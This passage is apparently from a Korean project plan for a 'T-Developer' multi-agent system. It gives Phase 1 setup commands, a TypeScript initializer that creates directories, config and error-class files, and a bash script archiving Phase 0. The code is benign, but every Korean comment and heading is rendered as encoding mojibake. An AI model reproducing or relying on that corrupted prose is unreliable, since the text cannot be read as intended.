- ì—ì´ì „íŠ¸ ê°„ í†µì‹  ê²€ì¦

## ğŸ¯ ë‹¤ìŒ ë‹¨ê³„

### Phase 1 ì‹œì‘ ì¤€ë¹„
```bash
# Phase 1 ë¸Œëœì¹˜ ìƒì„±
git checkout -b phase1-core-infrastructure

# Phase 1 ì‘ì—… ë””ë ‰í† ë¦¬ ì¤€ë¹„
mkdir -p backend/src/core
mkdir -p backend/src/data
mkdir -p backend/src/api

# Phase 1 ì²´í¬ë¦¬ìŠ¤íŠ¸ ìƒì„±
npm run phase1:init
```

### íŒ€ ì¤€ë¹„ ì‚¬í•­
1. Phase 0 ì½”ë“œ ë¦¬ë·° ì™„ë£Œ
2. AWS ê¶Œí•œ ë° ë¦¬ì†ŒìŠ¤ í™•ì¸
3. Phase 1 ì‘ì—… ë¶„ë‹´ íšŒì˜

---

**ì‘ì„±ì¼**: 2024-XX-XX  
**ì‘ì„±ì**: T-Developer Team
```

### SubTask 0.15.2: Phase 1 ì´ˆê¸° ì„¤ì •
**ëª©í‘œ**: Phase 1 ì‘ì—…ì„ ìœ„í•œ ê¸°ì´ˆ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/init-phase1.ts
import fs from 'fs/promises';
import path from 'path';
import chalk from 'chalk';

class Phase1Initializer {
  async initialize(): Promise<void> {
    console.log(chalk.blue.bold('\nğŸš€ Phase 1: ì½”ì–´ ì¸í”„ë¼ êµ¬ì¶• ì´ˆê¸°í™”\n'));
    
    // 1. ë””ë ‰í† ë¦¬ êµ¬ì¡° ìƒì„±
    await this.createDirectoryStructure();
    
    // 2. ê¸°ë³¸ íŒŒì¼ ìƒì„±
    await this.createBaseFiles();
    
    // 3. Phase 1 ì²´í¬ë¦¬ìŠ¤íŠ¸ ìƒì„±
    await this.createChecklist();
    
    console.log(chalk.green.bold('\nâœ… Phase 1 ì´ˆê¸°í™” ì™„ë£Œ!\n'));
    console.log(chalk.gray('ë‹¤ìŒ ëª…ë ¹ìœ¼ë¡œ ì‹œì‘í•˜ì„¸ìš”:'));
    console.log(chalk.cyan('  cd backend/src/core'));
    console.log(chalk.cyan('  npm run dev'));
  }
  
  private async createDirectoryStructure(): Promise<void> {
    const directories = [
      // ì½”ì–´ ì‹œìŠ¤í…œ
      'backend/src/core/config',
      'backend/src/core/errors',
      'backend/src/core/interfaces',
      'backend/src/core/utils',
      
      // ë°ì´í„° ë ˆì´ì–´
      'backend/src/data/repositories',
      'backend/src/data/models',
      'backend/src/data/migrations',
      'backend/src/data/cache',
      
      // API ë ˆì´ì–´
      'backend/src/api/controllers',
      'backend/src/api/routes',
      'backend/src/api/middleware',
      'backend/src/api/validators',
      
      // ì—ì´ì „íŠ¸ ì‹œìŠ¤í…œ
      'backend/src/agents/implementations',
      'backend/src/agents/orchestrator',
      'backend/src/agents/registry',
      
      // í…ŒìŠ¤íŠ¸
      'backend/tests/core',
      'backend/tests/data',
      'backend/tests/api',
      'backend/tests/agents'
    ];
    
    for (const dir of directories) {
      await fs.mkdir(dir, { recursive: true });
      console.log(chalk.green(`âœ“ Created: ${dir}`));
    }
  }
  
  private async createBaseFiles(): Promise<void> {
    // ì½”ì–´ ì„¤ì • íŒŒì¼
    const coreConfig = `// backend/src/core/config/index.ts
export interface CoreConfig {
  app: {
    name: string;
    version: string;
    env: string;
  };
  server: {
    port: number;
    host: string;
  };
  database: {
    dynamodb: {
      region: string;
      endpoint?: string;
    };
  };
  cache: {
    redis: {
      host: string;
      port: number;
    };
  };
  agents: {
    maxConcurrent: number;
    timeout: number;
  };
}

export const config: CoreConfig = {
  app: {
    name: 'T-Developer',
    version: process.env.npm_package_version || '1.0.0',
    env: process.env.NODE_ENV || 'development'
  },
  server: {
    port: parseInt(process.env.PORT || '3000'),
    host: process.env.HOST || '0.0.0.0'
  },
  database: {
    dynamodb: {
      region: process.env.AWS_REGION || 'us-east-1',
      endpoint: process.env.DYNAMODB_ENDPOINT
    }
  },
  cache: {
    redis: {
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379')
    }
  },
  agents: {
    maxConcurrent: parseInt(process.env.MAX_CONCURRENT_AGENTS || '50'),
    timeout: parseInt(process.env.AGENT_TIMEOUT || '300000')
  }
};
`;
    
    await fs.writeFile(
      'backend/src/core/config/index.ts',
      coreConfig
    );
    
    // ì—ëŸ¬ í´ë˜ìŠ¤
    const baseError = `// backend/src/core/errors/base-error.ts
export abstract class BaseError extends Error {
  abstract statusCode: number;
  abstract code: string;
  
  constructor(message: string) {
    super(message);
    Object.setPrototypeOf(this, BaseError.prototype);
  }
  
  abstract serializeErrors(): { message: string; field?: string }[];
}

export class NotFoundError extends BaseError {
  statusCode = 404;
  code = 'NOT_FOUND';
  
  constructor(public resource: string) {
    super(\`Resource not found: \${resource}\`);
    Object.setPrototypeOf(this, NotFoundError.prototype);
  }
  
  serializeErrors() {
    return [{ message: this.message }];
  }
}
`;
    
    await fs.writeFile(
      'backend/src/core/errors/base-error.ts',
      baseError
    );
    
    console.log(chalk.green('âœ“ Created base files'));
  }
  
  private async createChecklist(): Promise<void> {
    const checklist = `# Phase 1: ì½”ì–´ ì¸í”„ë¼ êµ¬ì¶• ì²´í¬ë¦¬ìŠ¤íŠ¸

## Task 1.1: í•µì‹¬ ì„¤ì • ì‹œìŠ¤í…œ
- [ ] ì¤‘ì•™ ì„¤ì • ê´€ë¦¬ì êµ¬í˜„
- [ ] í™˜ê²½ë³„ ì„¤ì • ë¡œë”
- [ ] ì„¤ì • ê²€ì¦ ì‹œìŠ¤í…œ
- [ ] ë™ì  ì„¤ì • ë¦¬ë¡œë“œ

## Task 1.2: ì—ëŸ¬ ì²˜ë¦¬ ì‹œìŠ¤í…œ
- [ ] ì»¤ìŠ¤í…€ ì—ëŸ¬ í´ë˜ìŠ¤ ê³„ì¸µêµ¬ì¡°
- [ ] ì „ì—­ ì—ëŸ¬ í•¸ë“¤ëŸ¬
- [ ] ì—ëŸ¬ ë¡œê¹… ë° ì¶”ì 
- [ ] ì—ëŸ¬ ë³µêµ¬ ì „ëµ

## Task 1.3: ë¡œê¹… ì¸í”„ë¼
- [ ] êµ¬ì¡°í™”ëœ ë¡œê¹… ì‹œìŠ¤í…œ
- [ ] ë¡œê·¸ ë ˆë²¨ ê´€ë¦¬
- [ ] ë¡œê·¸ ì§‘ê³„ ë° ì „ì†¡
- [ ] ì„±ëŠ¥ ë©”íŠ¸ë¦­ ë¡œê¹…

## Task 1.4: ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°
- [ ] DynamoDB í´ë¼ì´ì–¸íŠ¸ ì„¤ì •
- [ ] ì—°ê²° í’€ ê´€ë¦¬
- [ ] ì¬ì‹œë„ ë¡œì§
- [ ] ì—°ê²° ëª¨ë‹ˆí„°ë§

## Task 1.5: ìºì‹± ì‹œìŠ¤í…œ
- [ ] Redis í´ë¼ì´ì–¸íŠ¸ ì„¤ì •
- [ ] ìºì‹œ ì „ëµ êµ¬í˜„
- [ ] ìºì‹œ ë¬´íš¨í™” ë¡œì§
- [ ] ìºì‹œ íˆíŠ¸ìœ¨ ëª¨ë‹ˆí„°ë§

... (ì¶”ê°€ Tasks)
`;
    
    await fs.writeFile(
      'docs/phases/phase1-checklist.md',
      checklist
    );
    
    console.log(chalk.green('âœ“ Created Phase 1 checklist'));
  }
}

// ì‹¤í–‰
if (require.main === module) {
  const initializer = new Phase1Initializer();
  initializer.initialize().catch(console.error);
}
```

### SubTask 0.15.3: Phase 0 ì•„ì¹´ì´ë¸Œ ë° ë¬¸ì„œ ì •ë¦¬
**ëª©í‘œ**: Phase 0ì˜ ëª¨ë“  ì‘ì—…ë¬¼ì„ ì²´ê³„ì ìœ¼ë¡œ ì •ë¦¬í•˜ê³  ë³´ê´€

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# scripts/archive-phase0.sh

echo "ğŸ“¦ Phase 0 ì•„ì¹´ì´ë¸Œ ì‹œì‘..."

# 1. Phase 0 íƒœê·¸ ìƒì„±
git tag -a "phase0-complete" -m "Phase 0: ì‚¬ì „ ì¤€ë¹„ ë° í™˜ê²½ ì„¤ì • ì™„ë£Œ"

# 2. ë¬¸ì„œ ì •ë¦¬
mkdir -p docs/archive/phase0
cp -r docs/setup docs/archive/phase0/
cp -r docs/phases/phase0-* docs/archive/phase0/

# 3. ì„¤ì • íŒŒì¼ ë°±ì—…
mkdir -p backups/phase0
cp .env.example backups/phase0/
cp package.json backups/phase0/
cp -r .github backups/phase0/

# 4. ì²´í¬ë¦¬ìŠ¤íŠ¸ ì €ì¥
npm run phase0:checklist > docs/archive/phase0/final-checklist.txt

# 5. í†µê³„ ìƒì„±
echo "ğŸ“Š Phase 0 í†µê³„ ìƒì„± ì¤‘..."
cat > docs/archive/phase0/statistics.md << EOF
# Phase 0 í†µê³„

## ì½”ë“œ í†µê³„
- ì´ íŒŒì¼ ìˆ˜: $(find . -type f -name "*.ts" -o -name "*.js" | wc -l)
- TypeScript ë¼ì¸ ìˆ˜: $(find . -name "*.ts" -exec wc -l {} + | tail -1 | awk '{print $1}')
- í…ŒìŠ¤íŠ¸ íŒŒì¼ ìˆ˜: $(find . -name "*.test.ts" -o -name "*.spec.ts" | wc -l)

## Git í†µê³„
- ì´ ì»¤ë°‹ ìˆ˜: $(git rev-list --count HEAD)
- ê¸°ì—¬ì ìˆ˜: $(git shortlog -sn | wc -l)

## ì˜ì¡´ì„±
- Backend íŒ¨í‚¤ì§€: $(cd backend && npm ls --depth=0 | wc -l)
- Frontend íŒ¨í‚¤ì§€: $(cd frontend && npm ls --depth=0 | wc -l)

ìƒì„±ì¼: $(date)
EOF

echo "âœ… Phase 0 ì•„ì¹´ì´ë¸Œ ì™„ë£Œ!"
echo "ğŸ“ ì•„ì¹´ì´ë¸Œ ìœ„ì¹˜: docs/archive/phase0/"
```

---

ì´ì œ Phase 0ì˜ ëª¨ë“  ì‘ì—…ì´ ì™„ë£Œë˜ì—ˆìŠµë‹ˆë‹¤! 

Phase 0ì—ì„œëŠ” T-Developer í”„ë¡œì íŠ¸ì˜ ê¸°ë°˜ì´ ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í•µì‹¬ ìš”ì†Œë“¤ì„ êµ¬ì¶•í–ˆìŠµë‹ˆë‹¤:

1. **ê°œë°œ í™˜ê²½**: Node.js, TypeScript, AWS CLI, Docker ë“± í•„ìˆ˜ ë„êµ¬ ì„¤ì •
2. **í”„ë¡œì íŠ¸ êµ¬ì¡°**: ëª¨ë…¸ë ˆí¬ êµ¬ì¡°ì™€ ì²´ê³„ì ì¸ ë””ë ‰í† ë¦¬ êµ¬ì„±
3. **AWS ì¸í”„ë¼**: DynamoDB, S3, Bedrock í†µí•© ì¤€ë¹„
4. **ê°œë°œ ë„êµ¬**: ESLint, Prettier, Jest, Git hooks
5. **ë³´ì•ˆ**: í™˜ê²½ ë³€ìˆ˜ ì•”í˜¸í™”, ì…ë ¥ ê²€ì¦, ë³´ì•ˆ ë¯¸ë“¤ì›¨ì–´
6. **CI/CD**: GitHub Actions ì›Œí¬í”Œë¡œìš°
7. **ë¬¸ì„œí™”**: í¬ê´„ì ì¸ ê°œë°œ ê°€ì´ë“œ ë° API ë¬¸ì„œ
8. **ëª¨ë‹ˆí„°ë§**: ë¡œê¹…, ë©”íŠ¸ë¦­, ì—ëŸ¬ ì¶”ì 
9. **ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬**: BaseAgent ë° í†µì‹  í”„ë¡œí† ì½œ
10. **í†µí•© ì¤€ë¹„**: AWS Agent Squad, Bedrock AgentCore, Agno